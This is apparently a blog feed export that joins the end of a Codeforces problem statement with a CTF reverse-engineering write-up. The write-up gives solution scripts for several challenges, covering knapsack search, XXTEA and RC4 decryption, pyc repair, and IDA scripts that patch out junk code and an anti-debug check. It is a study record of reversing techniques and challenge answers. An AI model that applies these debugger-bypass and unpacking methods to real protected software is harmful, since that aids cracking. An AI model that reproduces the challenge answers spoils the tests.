<p>E. Counting Rectangles<br>time limit per test6 seconds<br>memory limit per test256 megabytes<br>inputstandard input<br>outputstandard output<br>You have n rectangles, the i-th rectangle has height hi and width wi.<br>You are asked q queries of the form hs ws hb wb.<br>For each query output, the total area of rectangles you own that can fit a rectangle of height hs and width ws while also fitting in a rectangle of height hb and width wb. In other words, print ∑hi⋅wi for i such that hs&lt;hi&lt;hb and ws&lt;wi&lt;wb.<br>Please note, that if two rectangles have the same height or the same width, then they cannot fit inside each other. Also note that you cannot rotate rectangles.<br>Please note that the answer for some test cases won’t fit into 32-bit integer type, so you should use at least 64-bit integer type in your programming language (like long long for C++).</p>
<blockquote>
<p>Input<br>The first line of the input contains an integer t (1≤t≤100) — the number of test cases.<br>The first line of each test case two integers n,q (1≤n≤105; 1≤q≤105) — the number of rectangles you own and the number of queries.<br>Then n lines follow, each containing two integers hi,wi (1≤hi,wi≤1000) — the height and width of the i-th rectangle.<br>Then q lines follow, each containing four integers hs,ws,hb,wb (1≤hs&lt;hb, ws&lt;wb≤1000) — the description of each query.<br>The sum of q over all test cases does not exceed 105, and the sum of n over all test cases does not exceed 105.<br>Output<br>For each test case, output q lines, the i-th line containing the answer to the i-th query.</p>
<blockquote>
<p>Example<br>inputCopy<br>3<br>2 1<br>2 3<br>3 2<br>1 1 3 4<br>5 5<br>1 1<br>2 2<br>3 3<br>4 4<br>5 5<br>3 3 6 6<br>2 1 4 5<br>1 1 2 10<br>1 1 100 100<br>1 1 3 3<br>3 1<br>999 999<br>999 999<br>999 998<br>1 1 1000 1000<br>outputCopy<br>6<br>41<br>9<br>0<br>54<br>4<br>2993004</p>
</blockquote>
</blockquote>
</blockquote>
<h5 id="Note"><a href="#Note" class="headerlink" title="Note"></a>Note</h5><h5 id="In-the-first-test-case-there-is-only-one-query-We-need-to-find-the-sum-of-areas-of-all-rectangles-that-can-fit-a-1×1-rectangle-inside-of-it-and-fit-into-a-3×4-rectangle"><a href="#In-the-first-test-case-there-is-only-one-query-We-need-to-find-the-sum-of-areas-of-all-rectangles-that-can-fit-a-1×1-rectangle-inside-of-it-and-fit-into-a-3×4-rectangle" class="headerlink" title="In the first test case, there is only one query. We need to find the sum of areas of all rectangles that can fit a 1×1 rectangle inside of it and fit into a 3×4 rectangle."></a>In the first test case, there is only one query. We need to find the sum of areas of all rectangles that can fit a 1×1 rectangle inside of it and fit into a 3×4 rectangle.</h5><h5 id="Only-the-2×3-rectangle-works-because-1-lt-2-comparing-heights-and-1-lt-3-comparing-widths-so-the-1×1-rectangle-fits-inside-and-2-lt-3-comparing-heights-and-3-lt-4-comparing-widths-so-it-fits-inside-the-3×4-rectangle-color"><a href="#Only-the-2×3-rectangle-works-because-1-lt-2-comparing-heights-and-1-lt-3-comparing-widths-so-the-1×1-rectangle-fits-inside-and-2-lt-3-comparing-heights-and-3-lt-4-comparing-widths-so-it-fits-inside-the-3×4-rectangle-color" class="headerlink" title="Only the 2×3 rectangle works, because 1&lt;2 (comparing heights) and 1&lt;3 (comparing widths), so the 1×1 rectangle fits inside, and 2&lt;3 (comparing heights) and 3&lt;4 (comparing widths), so it fits inside the 3×4 rectangle. $\color"></a>Only the 2×3 rectangle works, because 1&lt;2 (comparing heights) and 1&lt;3 (comparing widths), so the 1×1 rectangle fits inside, and 2&lt;3 (comparing heights) and 3&lt;4 (comparing widths), so it fits inside the 3×4 rectangle. $\color</h5>]]></content>
      <tags>
        <tag>codeforces</tag>
        <tag>c++</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>/2022/11/07/Execution/</url>
    <content><![CDATA[<span id="more"></span>]]></content>
  </entry>
  <entry>
    <title>hnctfRe</title>
    <url>/2022/11/02/hnctfRe/</url>
    <content><![CDATA[<h6 id="Some-reverse-questions-I-didn’t-have-time-to-solve-Or-didn’t-solve-out…"><a href="#Some-reverse-questions-I-didn’t-have-time-to-solve-Or-didn’t-solve-out…" class="headerlink" title="Some reverse questions I didn’t have time to solve. (Or didn’t solve out…)"></a>Some reverse questions I didn’t have time to solve. (Or didn’t solve out…)</h6><span id="more"></span>
<h3 id="Help-Me"><a href="#Help-Me" class="headerlink" title="Help_Me!"></a>Help_Me!</h3><h5 id="My-exp"><a href="#My-exp" class="headerlink" title="My exp:"></a>My exp:</h5><pre><code>#include&lt;bits/stdc++.h&gt;
using namespace std;
int v12[1000]=&#123;0&#125;;
int v13[1000]=&#123;0&#125;;
long long maxn;
int v[1000];
void dfs(int cns,int n,int num,long long sum)&#123;
    if (num&gt;200 || n==20)
    &#123;
        if (n!=20)
        sum-=v12[n];
        cns--;
        if (sum&gt;=maxn)&#123;
            maxn=sum;
            cout&lt;&lt;&quot;sum  =  &quot;&lt;&lt;sum&lt;&lt;&quot;    :  &quot;&lt;&lt;&quot;cns=&quot;&lt;&lt;cns&lt;&lt;&quot;   &quot;;
            for (int i=0;i&lt;cns;i++)&#123;
                cout&lt;&lt;v[i]&lt;&lt;&quot; &quot;;
            &#125;
            cout&lt;&lt;endl;
        &#125;
        return ;
    &#125;
    
    for (int i=n+1;i&lt;=20;i++)&#123;
        v[cns]=i;
        
        dfs(cns+1,i,num+v13[i],sum+v12[i]);
    &#125;
&#125;


int main()&#123;
    
    v12[0] = 26;
    v12[1] = 59;
    v12[2] = 30;
    v12[3] = 19;
    v12[4] = 66;
    v12[5] = 85;
    v12[6] = 94;
    v12[7] = 8;
    v12[8] = 3;
    v12[9] = 44;
    v12[20] = 1000;
    v12[10] = 5;
    v12[11] = 1;
    v12[12] = 41;
    v12[13] = 82;
    v12[14] = 76;
    v12[15] = 1;
    v12[16] = 12;
    v12[17] = 81;
    v12[18] = 73;
    v12[19] = 32;
    v12[20]=1;
    v13[0] = 71;
    v13[1] = 34;
    v13[20] = 1000;
    v13[2] = 82;
    v13[3] = 23;
    v13[4] = 1;
    v13[5] = 88;
    v13[6] = 12;
    v13[7] = 57;
    v13[8] = 10;
    v13[9] = 68;
    v13[10] = 5;
    v13[11] = 33;
    v13[12] = 37;
    v13[13] = 69;
    v13[14] = 98;
    v13[15] = 24;
    v13[16] = 26;
    v13[17] = 83;
    v13[18] = 16;
    v13[19] = 26;
    v13[20]=1;
    maxn=0;
    dfs(0,-1,0,1);
&#125;
</code></pre>
<h5 id="Official-exp"><a href="#Official-exp" class="headerlink" title="Official exp:"></a>Official exp:</h5><pre><code>#include &quot;iostream&quot;
#include &quot;stdio.h&quot;
using namespace std;
int val[50]=&#123;26, 59, 30, 19, 66, 85, 94, 8, 3, 44, 5, 1, 41, 82, 76, 1,    12,    81,    73,    32&#125;,
w[50]=&#123;71, 34, 82, 23, 1,88,12,57, 10, 68, 5, 33,    37,    69,    98,    24, 26,    83, 16, 26&#125;;
int dp[21][301];
int main()
&#123;
    int t=200;
    int m = 20;
    for(int i=1;i&lt;=m;i++) 
        for(int j=t;j&gt;=0;j--)  
    &#123;
        if(j&gt;=w[i])//容量可以放 
        &#123;
            int tmp;
            dp[i][j]=max(dp[i-1][j-w[i]]+val[i],dp[i-1][j]);
        &#125;  
        else
        &#123;
            dp[i][j]=dp[i-1][j];
        &#125;              
    &#125;
    //dp[i][j] = max(dp[i-1][j-w[i]]+val[i],dp[i-1][j]);
    int x = 20;
    int y = 200;
    while(x!=0)
    &#123;
        if(dp[x-1][y-w[x]]+val[x] &gt; dp[x-1][y])        
        &#123;
            printf(&quot;%d,&quot;,x); 
            y-=w[x];
        &#125;
        x-=1;
    &#125;
    return 0;
&#125;
</code></pre>
<h5 id="A-0-1-bag-problem-And-notice-that-you-should-ADD-v12-not-MULTIPLY-like-in-the-ida……"><a href="#A-0-1-bag-problem-And-notice-that-you-should-ADD-v12-not-MULTIPLY-like-in-the-ida……" class="headerlink" title="A 0-1 bag problem. And notice that you should ADD v12, not MULTIPLY, like in the ida……"></a>A 0-1 bag problem. And notice that you should <c style="color: #FF0000;">ADD</c> v12, not MULTIPLY, like in the ida……</h5><h3 id="CM2"><a href="#CM2" class="headerlink" title="CM2"></a>CM2</h3><h6 id="Don’t-understand-how-to-debug-to-find-the-place…-Though-by-guessing-I-work-it-out-anyway"><a href="#Don’t-understand-how-to-debug-to-find-the-place…-Though-by-guessing-I-work-it-out-anyway" class="headerlink" title="Don’t understand how to debug to find the place… Though by guessing I work it out anyway."></a>Don’t understand how to debug to find the place… Though by guessing I work it out anyway.</h6><h5 id="Officail-wp"><a href="#Officail-wp" class="headerlink" title="Officail wp:"></a>Officail wp:</h5><p><img src="/2022/11/02/hnctfRe/cm2.png" alt="cm2"></p>
<h3 id="Try2debugPlusPlus"><a href="#Try2debugPlusPlus" class="headerlink" title="Try2debugPlusPlus"></a>Try2debugPlusPlus</h3><h5 id="Nop-the-IsDebuggerPresent-noticed-that-there-are-two-of-them-and-get-the-key-remember-to-set-breakpoint-after-printf"><a href="#Nop-the-IsDebuggerPresent-noticed-that-there-are-two-of-them-and-get-the-key-remember-to-set-breakpoint-after-printf" class="headerlink" title="Nop the IsDebuggerPresent()(noticed that there are two of them) and get the key(remember to set breakpoint after printf()):"></a>Nop the <code>IsDebuggerPresent()</code>(noticed that there are two of them) and get the key(remember to set breakpoint after <code>printf()</code>):</h5><p><img src="/2022/11/02/hnctfRe/debug2_1.png" alt="debug2_1"></p>
<h5 id="Though-is-easy-for-us-to-decrypt-the-tea-encrypt-question-setter-seems-to-have-forgotten-something…"><a href="#Though-is-easy-for-us-to-decrypt-the-tea-encrypt-question-setter-seems-to-have-forgotten-something…" class="headerlink" title="Though is easy for us to decrypt the tea_encrypt, question setter seems to have forgotten something…"></a>Though is easy for us to decrypt the tea_encrypt, question setter seems to have forgotten something…</h5><p><img src="/2022/11/02/hnctfRe/debug2_2.png" alt="debug2_2"></p>
<h3 id="What-1in-D11"><a href="#What-1in-D11" class="headerlink" title="What_1in_D11"></a>What_1in_D11</h3><h5 id="Repair-the-upx’s-features-easy-in-this-problem-to-study-more-you-can-refer-to-this-blog"><a href="#Repair-the-upx’s-features-easy-in-this-problem-to-study-more-you-can-refer-to-this-blog" class="headerlink" title="Repair the upx’s features(easy in this problem, to study more you can refer to this blog)"></a>Repair the upx’s features(easy in this problem, to study more you can refer to <a href="https://www.52pojie.cn/thread-326995-1-1.html">this blog</a>)</h5><h5 id="And-upx-d-to-unpacked-the-dll-check-it-in-ida-we-got"><a href="#And-upx-d-to-unpacked-the-dll-check-it-in-ida-we-got" class="headerlink" title="And upx -d to unpacked the .dll, check it in ida, we got:"></a>And <code>upx -d</code> to unpacked the .dll, check it in ida, we got:</h5><p><img src="/2022/11/02/hnctfRe/dll_1.png" alt="dll"></p>
<h5 id="Official-writeup"><a href="#Official-writeup" class="headerlink" title="Official writeup:"></a>Official writeup:</h5><h6 id="A-btea-encrypt-which-I-am-not-fimilar-with-yet-Shall-get-more-study-about-encryption-and-decryption-later"><a href="#A-btea-encrypt-which-I-am-not-fimilar-with-yet-Shall-get-more-study-about-encryption-and-decryption-later" class="headerlink" title="(A btea encrypt, which I am not fimilar with yet. Shall get more study about encryption and decryption later.)"></a>(A btea encrypt, which I am not fimilar with yet. Shall get more study about encryption and decryption later.)</h6><pre><code>#include &lt;stdio.h&gt;  
#include &lt;stdint.h&gt;  
#define DELTA 0x9e3779b9  
#define MX (((z&gt;&gt;5^y&lt;&lt;2) + (y&gt;&gt;3^z&lt;&lt;4)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z)))  
void btea(uint32_t *v, int n, uint32_t const key[4])  
&#123;  
    uint32_t y, z, sum;  
    unsigned p, rounds, e;  
    if (n &gt; 1)            /* Coding Part */  
    &#123;  
        rounds = 6 + 52/n;  
        sum = 0;  
        z = v[n-1];  
        do  
        &#123;  
            sum += DELTA;  
            e = (sum &gt;&gt; 2) &amp; 3;  
            for (p=0; p&lt;n-1; p++)  
            &#123;  
                y = v[p+1];  
                z = v[p] += MX;  
            &#125;  
            y = v[0];  
            z = v[n-1] += MX;  
        &#125;  
        while (--rounds);  
    &#125;  
    else if (n &lt; -1)      /* Decoding Part */  
    &#123;  
        n = -n;  
        rounds = 6 + 52/n;  
        sum = rounds*DELTA;  
        y = v[0];  
        do  
        &#123;  
            e = (sum &gt;&gt; 2) &amp; 3;  
            for (p=n-1; p&gt;0; p--)  
            &#123;  
                z = v[p-1];  
                y = v[p] -= MX;  
            &#125;  
            z = v[n-1];  
            y = v[0] -= MX;  
            sum -= DELTA;  
        &#125;  
        while (--rounds);  
    &#125;  
&#125;  
int main()  
&#123;  
    unsigned int enc[8]=&#123;0x22a577c1,0x1c12c03,0xc74c3ebd,0xa9d03c85,0xadb8ffb3&#125;;
    uint32_t const k[4]= &#123;55,66,77,88&#125;;  
    int n= 5; //n的绝对值表示v的长度，取正表示加密，取负表示解密  
    // v为要加密的数据是两个32位无符号整数  
    // k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位  
    btea(enc, -n, k);  
    for(int i=0;i&lt;5;i++)
    &#123;
            printf(&quot;%x&quot;,enc[i]);
        &#125;
    return 0;  
&#125;  
</code></pre>
<h3 id="Mazes"><a href="#Mazes" class="headerlink" title="Mazes"></a>Mazes</h3><h6 id="A-bit-complex-wait-until-later…"><a href="#A-bit-complex-wait-until-later…" class="headerlink" title="A bit complex, wait until later…"></a>A bit complex, wait until later…</h6><h3 id="stub"><a href="#stub" class="headerlink" title="stub"></a>stub</h3><h6 id="Never-seen-before-later…"><a href="#Never-seen-before-later…" class="headerlink" title="Never seen before, later…"></a>Never seen before, later…</h6><h3 id="ez-maze"><a href="#ez-maze" class="headerlink" title="ez_maze"></a>ez_maze</h3><h5 id="We-get-a-exe-file-from-its’-icon-we-know-that-we-should-uncompile-it-to-pyc-with-pyinstxtractor"><a href="#We-get-a-exe-file-from-its’-icon-we-know-that-we-should-uncompile-it-to-pyc-with-pyinstxtractor" class="headerlink" title="We get a .exe file, from its’ icon we know that we should uncompile it to .pyc with pyinstxtractor"></a>We get a .exe file, from its’ icon we know that we should uncompile it to .pyc with <code>pyinstxtractor</code></h5><p><img src="/2022/11/02/hnctfRe/ez_maze_1.png" alt="ez_maze"></p>
<h5 id="Then-we-got-a-package-extracted"><a href="#Then-we-got-a-package-extracted" class="headerlink" title="Then, we got a package _extracted:"></a>Then, we got a package <code>_extracted</code>:</h5><h6 id="complex-it-is…"><a href="#complex-it-is…" class="headerlink" title="complex it is…"></a>complex it is…</h6><p><img src="/2022/11/02/hnctfRe/extracted.png" alt="extracted"></p>
<h5 id="Find-a-file-named-maze-without-a-suffix-one-Change-its-suffix-into-pyc-and-Try-compyle6-o-maze-py-maze-pyc-it-went-wrong"><a href="#Find-a-file-named-maze-without-a-suffix-one-Change-its-suffix-into-pyc-and-Try-compyle6-o-maze-py-maze-pyc-it-went-wrong" class="headerlink" title="Find a file named maze (without a suffix one!) Change its suffix into .pyc and Try compyle6 -o maze.py maze.pyc, it went wrong:"></a>Find a file named <code>maze</code> (without a suffix one!) Change its suffix into <code>.pyc</code> and Try <code>compyle6 -o maze.py maze.pyc</code>, it went wrong:</h5><p><img src="/2022/11/02/hnctfRe/uncompyle6.png" alt="compyle6"></p>
<h5 id="That’s-when-you-find-out-that-pyinstxtractor-didn’t-fix-your-pyc-file’s-magic-number"><a href="#That’s-when-you-find-out-that-pyinstxtractor-didn’t-fix-your-pyc-file’s-magic-number" class="headerlink" title="That’s when you find out that pyinstxtractor didn’t fix your .pyc file’s magic number."></a>That’s when you find out that pyinstxtractor didn’t fix your .pyc file’s magic number.</h5><p><img src="/2022/11/02/hnctfRe/cmakeInstall.png" alt="cmake"></p>
<h5 id="The-link-problem-setter-gives-you-which-does-no-help-at-all…The-magic-number-of-the-file-struct-is-destroy-as-well…"><a href="#The-link-problem-setter-gives-you-which-does-no-help-at-all…The-magic-number-of-the-file-struct-is-destroy-as-well…" class="headerlink" title="The link problem setter gives you, which does no help at all…The magic number of the file struct is destroy as well…"></a><a href="https://www.jb51.net/article/231188.htm">The link problem setter gives you</a>, which does no help at all…The <code>magic number</code> of the file <code>struct</code> is destroy as well…</h5><p><img src="/2022/11/02/hnctfRe/magicNumber_1.jpg" alt="magicNumber_1"></p>
<h5 id="I-been-trying-tools-like-uncompyle6-which-does-not-support-python-3-10-and-install-python-3-9-does-not-help-at-all-Later-I-should-look-into-this-problem-and-try-to-solved-it…-and-pycdc-which-is-said-to-support-high-edition-but-can-not-identify-the-magic-number-as-well-However-when-I-tried-to-add-some-magic-number-from-other-python-edition-Python-3-8b2-if-I-remember-it-right-and-put-it-in-an-online-uncompiler-It-just-worked…"><a href="#I-been-trying-tools-like-uncompyle6-which-does-not-support-python-3-10-and-install-python-3-9-does-not-help-at-all-Later-I-should-look-into-this-problem-and-try-to-solved-it…-and-pycdc-which-is-said-to-support-high-edition-but-can-not-identify-the-magic-number-as-well-However-when-I-tried-to-add-some-magic-number-from-other-python-edition-Python-3-8b2-if-I-remember-it-right-and-put-it-in-an-online-uncompiler-It-just-worked…" class="headerlink" title="I been trying tools like uncompyle6(which does not support python 3.10, and install python 3.9 does not help at all. Later I should look into this problem and try to solved it…)  and pycdc(which is said to support high edition, but can not identify the magic number as well) However, when I tried to add some magic number from other python edition(Python 3.8b2, if I remember it right), and put it in an online uncompiler. It just worked…"></a>I been trying tools like <code>uncompyle6</code>(which does not support python 3.10, and install python 3.9 does not help at all. Later I should look into this problem and try to solved it…)  and <code>pycdc</code>(which is said to support high edition, but can not identify the magic number as well) However, when I tried to add some magic number from other python edition(Python 3.8b2, if I remember it right), and put it in an <a href="https://tool.lu/pyc/">online uncompiler</a>. It just worked…</h5><blockquote>
<p><a href="https://www.cnblogs.com/Here-is-SG/p/15885799.html">a blog from my classmate that may help(though I do not really think so…)</a></p>
</blockquote>
<h5 id="some-magic-number"><a href="#some-magic-number" class="headerlink" title="some magic number:"></a>some magic number:</h5><pre><code>enum PycMagic &#123;
    MAGIC_1_0 = 0x00999902,
    MAGIC_1_1 = 0x00999903, /* Also covers 1.2 */
    MAGIC_1_3 = 0x0A0D2E89,
    MAGIC_1_4 = 0x0A0D1704,
    MAGIC_1_5 = 0x0A0D4E99,
    MAGIC_1_6 = 0x0A0DC4FC,

    MAGIC_2_0 = 0x0A0DC687,
    MAGIC_2_1 = 0x0A0DEB2A,
    MAGIC_2_2 = 0x0A0DED2D,
    MAGIC_2_3 = 0x0A0DF23B,
    MAGIC_2_4 = 0x0A0DF26D,
    MAGIC_2_5 = 0x0A0DF2B3,
    MAGIC_2_6 = 0x0A0DF2D1,
    MAGIC_2_7 = 0x0A0DF303,

    MAGIC_3_0 = 0x0A0D0C3A,
    MAGIC_3_1 = 0x0A0D0C4E,
    MAGIC_3_2 = 0x0A0D0C6C,
    MAGIC_3_3 = 0x0A0D0C9E,
    MAGIC_3_4 = 0x0A0D0CEE,
    MAGIC_3_5 = 0x0A0D0D16,
    MAGIC_3_5_3 = 0x0A0D0D17,
    MAGIC_3_6 = 0x0A0D0D33,
    MAGIC_3_7 = 0x0A0D0D42,
    MAGIC_3_8 = 0x0A0D0D55,
    MAGIC_3_9 = 0x0A0D0D61,
&#125;;
</code></pre>
<h5 id="uncompyle-to-long-the-maze-is-I-didn’t-put-it-here"><a href="#uncompyle-to-long-the-maze-is-I-didn’t-put-it-here" class="headerlink" title="uncompyle:(to long the maze is, I didn’t put it here)"></a>uncompyle:(to long the maze is, I didn’t put it here)</h5><p><img src="/2022/11/02/hnctfRe/uncompyle.jpg" alt="uncompyle"></p>
<h5 id="Dfs-script-From-official-wp"><a href="#Dfs-script-From-official-wp" class="headerlink" title="Dfs script(From official wp):"></a>Dfs script(From official wp):</h5><pre><code>map1=[...]
map2 =  [[0 for i in range(len(map1))] for i in range(len(map1)) ]
flag=&quot;&quot;
def DFS(x,y):
    global flag
    if x == len(map1) - 2 and y == len(map1) - 2: #判断边界
        print(flag)
    if map1[x+1][y] == 0 and map2[x+1][y] == 0:
        map2[x][y] = 1
        flag += &#39;s&#39;
        DFS(x+1,y)
        flag = flag[:-1]
        map2[x][y] = 0
    if map1[x-1][y] == 0 and map2[x-1][y] == 0:
        map2[x][y] = 1
        flag += &#39;w&#39;
        DFS(x-1,y)
        flag = flag[:-1]
        map2[x][y] = 0
    if map1[x][y+1] == 0 and map2[x][y+1] == 0:
        map2[x][y] = 1
        flag += &#39;d&#39;
        DFS(x,y+1)
        flag = flag[:-1]
        map2[x][y] = 0
    if map1[x][y-1] == 0 and map2[x][y-1] == 0:
        map2[x][y] = 1
        flag += &#39;a&#39;
        DFS(x,y-1)
        flag = flag[:-1]
        map2[x][y] = 0
y=1
x=1
DFS(x,y)
</code></pre>
<h3 id="findit"><a href="#findit" class="headerlink" title="findit"></a>findit</h3><h5 id="Gets-a-exe-file-check-whether-shell-exists"><a href="#Gets-a-exe-file-check-whether-shell-exists" class="headerlink" title="Gets a .exe file, check whether shell exists."></a>Gets a .exe file, check whether shell exists.</h5><p><img src="/2022/11/02/hnctfRe/findItShell.png" alt="shell"></p>
<h5 id="Open-it-with-ida"><a href="#Open-it-with-ida" class="headerlink" title="Open it with ida."></a>Open it with ida.</h5><p><img src="/2022/11/02/hnctfRe/finditIda_1.png" alt="ida1"><br><img src="/2022/11/02/hnctfRe/finditIda_2.png" alt="ida2"><br><img src="/2022/11/02/hnctfRe/finditIda_3.png" alt="ida3"></p>
<h5 id="A-complex-encryption-The-key-and-the-flag-both-needs-to-be-brute-forces-out-I-shall-do-a-emersion-later…"><a href="#A-complex-encryption-The-key-and-the-flag-both-needs-to-be-brute-forces-out-I-shall-do-a-emersion-later…" class="headerlink" title="A complex encryption. The key and the flag both needs to be brute forces out. I shall do a emersion later…"></a>A complex encryption. The key and the flag both needs to be brute forces out. I shall do a emersion later…</h5><h5 id="Official-wp"><a href="#Official-wp" class="headerlink" title="Official wp:"></a>Official wp:</h5><pre><code>mid=[32,59,121,60,125,45,32,17,38,0,43,45,48,48,28,42,11,20,49,100,63,119,103,53,173,46,136,158,49,78,78,176]
enc=[29,70,92,84,87,19,61,43,62,60,29,9,18,63,6,6,42,14,124,110,109,60,105,191,7,162,64,104,92,61,223,179]
flag=[0]*32
flag[31]=179
flag[30]=223
print(flag)
#th1s_3ncryt_is_s0_e@sy!1
key = [ord(i) for i in &quot;HN_CTF&quot;]
def decrypt(arr):
    for i in range(0,len(arr)//4):
        tmp = arr[4*i:4*i+4]
        st = &quot;&quot;
        st+=chr(tmp[3]^key[i%6])
        st+=chr(tmp[0]^key[i%6])
        st+=chr(tmp[2]^key[i%6])
        st+=chr(tmp[1]^key[i%6])
        print(st,end=&#39;&#39;)
    print()   
    pass
def dfs(deep):
    global flag
    if(deep==0):
        decrypt(flag)
    else:
        for i in range(0,0xff):
            if( enc[deep-1] == (0x12+deep-1)^ ((i+12)%24 )^ i ^ flag[deep]):
                flag[deep-1] = i
                dfs(deep-1)
dfs(31)
</code></pre>
<h3 id="flower"><a href="#flower" class="headerlink" title="flower"></a>flower</h3><h5 id="From-ida-there-are-a-lot-of-junkcodes-inside-and-we-have-to-patch-them-before-I-can-analyze-the-code"><a href="#From-ida-there-are-a-lot-of-junkcodes-inside-and-we-have-to-patch-them-before-I-can-analyze-the-code" class="headerlink" title="From ida, there are a lot of junkcodes inside, and we have to patch them before I can analyze the code."></a>From ida, there are a lot of junkcodes inside, and we have to patch them before I can analyze the code.</h5><p><a href="https://www.52pojie.cn/thread-1512089-1-1.html">junkcode</a></p>
<h5 id="Some-script-to-nop-the-junkcodes"><a href="#Some-script-to-nop-the-junkcodes" class="headerlink" title="Some script to nop the junkcodes:"></a>Some script to nop the junkcodes:</h5><p><img src="/2022/11/02/hnctfRe/flower_junkcode_1.png" alt="junkcode1"></p>
<h5 id="scripts1"><a href="#scripts1" class="headerlink" title="scripts1:"></a>scripts1:</h5><pre><code>import idc
import idautils
start =0x00401000
end = 0x00401401
bad=[0x75,0x02,0x74,0x01,0xc7]

for i in range(start,end):
    if idc.get_wide_byte(i) == 0x75:
        flag=1
        for j in range(len(bad)):
            if(idc.get_wide_byte(i+j)!= bad[j]):
                flag=0
                break
        if flag==1:
            for j in range(len(bad)):
                patch_byte(i+j,0x90)
                print(&quot;success&quot;)
</code></pre>
<h5 id="scripts2"><a href="#scripts2" class="headerlink" title="scripts2:"></a>scripts2:</h5><p><img src="/2022/11/02/hnctfRe/flower_junkcode_2.png" alt="junkcode2"></p>
<pre><code>import idc
import idautils
start =0x00401000
end = 0x00401401
bad=[0xe8,0x01,0x00,0x00,0x00,0xe8,0x36,0x83,0x04,0x24,0x08,0xc3,0xe8]

for i in range(start,end):
    if idc.get_wide_byte(i) == 0xe8:
        flag=1
        for j in range(len(bad)):
            if(idc.get_wide_byte(i+j)!= bad[j]):
                flag=0
                break
        if flag==1:
            for j in range(len(bad)):
                patch_byte(i+j,0x90)
                print(&quot;success&quot;)
</code></pre>
<h6 id="Some-interlude"><a href="#Some-interlude" class="headerlink" title="Some interlude:"></a>Some interlude:</h6><p><img src="/2022/11/02/hnctfRe/flowerPDF.png" alt="PDF"></p>
<h5 id="Anyway-the-uncompilation-shall-look-like-this"><a href="#Anyway-the-uncompilation-shall-look-like-this" class="headerlink" title="Anyway, the uncompilation shall look like this:"></a>Anyway, the uncompilation shall look like this:</h5><p><img src="/2022/11/02/hnctfRe/flowerIda.png" alt="ida"></p>
<h5 id="The-encrypt-function"><a href="#The-encrypt-function" class="headerlink" title="The encrypt function:"></a>The encrypt function:</h5><p><img src="/2022/11/02/hnctfRe/flowerEncrypt.png" alt="encrypt"></p>
<h5 id="Now-we-get-the-encryption-we-can-know-that-it-is-a-RC4-encryption-and-here-comes-the-official-exp"><a href="#Now-we-get-the-encryption-we-can-know-that-it-is-a-RC4-encryption-and-here-comes-the-official-exp" class="headerlink" title="Now we get the encryption, we can know that it is a RC4- encryption, and here comes the official exp:"></a>Now we get the encryption, we can know that it is a RC4- encryption, and here comes the official exp:</h5><pre><code>#include &lt;iostream&gt;
using namespace std;
unsigned int ar[40] = &#123; 0x4d,0xffffffe6,0x49,0xffffff95,0x3,0x2d,0x2b,0xffffffba,0xffffffea,0x6d,0xffffffff,0x59,0x70,0x0,0x1b,0xffffffa9,0x2c,0xffffffb0,0x32,0xffffff98,0x6f,0xffffff8c,0x56,0xffffffa2,0x4c,0x79,0x7f &#125;;
// c[i]_ = c[i]^c[(i+1)%27]
// c[26]_ = c[26]^c_[0]
unsigned char st[16] = &quot;Hello_Ctfers!!!&quot;;
void O0oo00OOo00o0(unsigned char *m, int mlen, int keylen) &#123;
        unsigned char s[256];
        unsigned char t[256];
        int i;
        for ( i = 0; i &lt; 256; i++) &#123; //初始化s和t向量 
                s[i] = i;
                t[i] = st[i%keylen];
        &#125;        
        int j = 0;
        for ( i = 0; i &lt; 256; i++) &#123;
                j = (j + s[i] + t[i]) % 256;
                swap(s[i],s[j]);
                //根据t向量打乱s盒 
        &#125;
        unsigned char k[64];//保存秘钥流，或者直接进行异或 
        i = 0; j = 0; 
        int tmp;
        int index ;
        for ( index = 0; index &lt; mlen; index++) &#123;   //生成与明文长度一致的秘钥流 
                i = (i + 3) % 256;
                j = (j + s[i]+1) % 256;
                swap(s[i],s[j]); 
                tmp = (s[i] + s[j]) % 256;
                k[index] = s[tmp];//保存秘钥 
        &#125;
        for (i = 0; i &lt; mlen; i++)
        &#123;
                m[i] = m[i] ^ k[i];//主要进行了一步异或，加密的逆过程就是解密 
        &#125;
&#125;
int main()
&#123;
        char c[27]=&#123;0x4d,0xffffffe6,0x49,0xffffff95,0x3,0x2d,0x2b,0xffffffba,0xffffffea,0x6d,0xffffffff,0x59,0x70,0x0,0x1b,0xffffffa9,0x2c,0xffffffb0,0x32,0xffffff98,0x6f,0xffffff8c,0x56,0xffffffa2,0x4c,0x79,0x7f &#125;;
        int i;
        for(i=26;i&gt;=0;i--)
        &#123;
                c[i] = c[(i+1)%27]^c[i];
        &#125;
        for(i=0;i&lt;27;i++)
        &#123;
                printf(&quot;0x%x,&quot;,c[i]) ;
        &#125;
        O0oo00OOo00o0((unsigned char *)c,27,16);
        printf(&quot;\n&quot;);
                for(i=0;i&lt;27;i++)
        &#123;
                printf(&quot;%c&quot;,c[i]&amp;0xff) ;
        &#125;
&#125;
</code></pre>
<h5 id="It-base-on-static-crack-here-but-a-bro-told-me-that-since-there-is-only-ONE-XOR-that-really-do-something-to-your-flag-you-can-dynamic-debug-to-get-the-array-v4-in-the-upper-encryption-photograth-Which-is-really-genius-because-whether-you-know-how-to-decrypt-rc4-or-not-you-can-solve-this-problem-and-it-do-save-you-tons-of-work"><a href="#It-base-on-static-crack-here-but-a-bro-told-me-that-since-there-is-only-ONE-XOR-that-really-do-something-to-your-flag-you-can-dynamic-debug-to-get-the-array-v4-in-the-upper-encryption-photograth-Which-is-really-genius-because-whether-you-know-how-to-decrypt-rc4-or-not-you-can-solve-this-problem-and-it-do-save-you-tons-of-work" class="headerlink" title="It base on static crack here, but a bro told me that since there is only ONE XOR that really do something to your flag, you can dynamic debug to get the array v4. (in the upper encryption photograth) Which is really genius because whether you know how to decrypt rc4 or not you can solve this problem and it do save you tons of work!"></a>It base on static crack here, but a bro told me that since there is only <c style="color: #FF0000;">ONE</c> <code>XOR</code> that really do something to your flag, you can dynamic debug to get the array <code>v4</code>. (in the upper encryption photograth) Which is really genius because whether you know how to decrypt rc4 or not you can solve this problem and it do save you tons of work!</h5><h6 id="Just-input-a-series-of-‘1’-and-look-into-the-ECX-register"><a href="#Just-input-a-series-of-‘1’-and-look-into-the-ECX-register" class="headerlink" title="Just input a series of ‘1’ and look into the ECX register!"></a>Just input a series of ‘1’ and look into the <code>ECX</code> register!</h6><p><img src="/2022/11/02/hnctfRe/dynamic_1.png" alt="dynamic_1"><br><img src="/2022/11/02/hnctfRe/dynamic_2.png" alt="dynamic_2"><br><img 